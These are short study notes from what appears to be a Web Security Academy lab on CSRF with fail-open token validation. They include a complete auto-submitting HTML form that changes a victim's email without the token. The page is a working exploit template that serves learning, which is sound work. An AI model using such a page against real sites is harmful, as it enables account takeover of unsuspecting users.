CSRF where token validation depends on token being present:

    -The server should verify the CSRF token is present in the request and correct to avoid fail-open.
    -The parameter of CSRF token should be removed so that an attacker can break through via victim browser
    -Create a HTML code that automatically executes a POST request to the email update without the token parameter
    -<html>
        <body>
            <h1>Hello</h1>
            <iframe src="display:none" name="csrf-i"></iframe>
            <form action="https://0a9600980449736380e53a890061003d.web-security-academy.net/my-account/change-email" method="post" id="csrf-f" target="csrf-i">
                <input type="hidden" name="email" value="test1@test.ca">
            </form>
            <script>document.getElementById("csrf-f").submit()</script>
        </body>
    </html>
    
